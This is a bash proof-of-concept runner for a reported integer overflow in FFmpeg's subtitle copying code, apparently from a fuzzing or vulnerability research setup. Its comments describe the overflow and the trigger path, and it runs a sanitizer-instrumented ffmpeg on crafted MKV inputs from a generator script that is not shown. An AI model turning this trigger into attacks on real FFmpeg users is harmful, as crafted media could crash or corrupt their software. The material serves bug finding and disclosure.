#!/bin/bash
# PoC runner for VULN-001: copy_av_subtitle integer overflow
# fftools/ffmpeg_dec.c lines 503-514
#
# Vulnerability: buf_size = src_rect->h * src_rect->linesize[j]
# Both are int. If product > INT_MAX, wraps to small positive
# (underallocation, downstream OOB) or negative (huge size_t,
# av_memdup returns NULL -> NULL ptr dereference).
#
# Trigger path:
#   ffmpeg -fix_sub_duration -i <crafted_mkv>
#   -> DVB-Sub decoder decodes subtitle with large region
#   -> fix_sub_duration_heartbeat() (triggered by video keyframe)
#   -> subtitle_wrap_frame(copy=1) -> copy_av_subtitle()
#   -> buf_size computed as int*int (possible overflow)
#
# Requirements for heartbeat:
#   - Output video stream with -fix_sub_duration_heartbeat
#   - Video keyframes in the output trigger sch_mux_sub_heartbeat
#   - The subtitle must have been decoded first (stored in sub_prev)

set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
RESULT=vuln_001_result.txt

echo "=== VULN-001 PoC: copy_av_subtitle integer overflow ===" | tee "$RESULT"
echo "Binary: $BIN" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 1: Generate small-dimension MKV (for code path reachability)
echo "[*] Step 1: Small dimensions (200x200) - code path reachability" | tee -a "$RESULT"
python3 vuln_001_gen.py 2>&1 | tee -a "$RESULT"

echo "" | tee -a "$RESULT"
echo "[*] Running ffmpeg (small dims, with -fix_sub_duration) ..." | tee -a "$RESULT"

ASAN_OPTIONS="abort_on_error=0:halt_on_error=0:log_path=./asan_001_small" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
  "$BIN" -y \
    -f lavfi -i "color=black:320x240:rate=1:duration=5" \
    -fix_sub_duration -i vuln_001_input.mkv \
    -map 0:v -map 1:s \
    -c:v mpeg2video -c:s dvbsub \
    -fix_sub_duration_heartbeat \
    -f mpegts /dev/null \
  2>&1 | tee -a "$RESULT" || true

echo "" | tee -a "$RESULT"
if ls asan_001_small.* 2>/dev/null | grep -q .; then
    echo "[!] ASAN output (small dims):" | tee -a "$RESULT"
    cat asan_001_small.* 2>/dev/null | tee -a "$RESULT"
fi

# Step 2: Generate large-dimension MKV (targeting the overflow)
echo "" | tee -a "$RESULT"
echo "[*] Step 2: Large dimensions (32767x40000) - overflow stress" | tee -a "$RESULT"
python3 vuln_001_gen.py --large 2>&1 | tee -a "$RESULT"

echo "" | tee -a "$RESULT"
echo "[*] Running ffmpeg (large dims, with -fix_sub_duration) ..." | tee -a "$RESULT"

ASAN_OPTIONS="abort_on_error=0:halt_on_error=0:log_path=./asan_001_large" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
  "$BIN" -y \
    -f lavfi -i "color=black:320x240:rate=1:duration=5" \
    -fix_sub_duration -i vuln_001_input.mkv \
    -map 0:v -map 1:s \
    -c:v mpeg2video -c:s dvbsub \
    -fix_sub_duration_heartbeat \
    -f mpegts /dev/null \
  2>&1 | tee -a "$RESULT" || true

echo "" | tee -a "$RESULT"
if ls asan_001_large.* 2>/dev/null | grep -q .; then
    echo "[!] ASAN output (large dims):" | tee -a "$RESULT"
    cat asan_001_large.* 2>/dev/null | tee -a "$RESULT"
fi

echo "" | tee -a "$RESULT"
echo "=== Done ===" | tee -a "$RESULT"
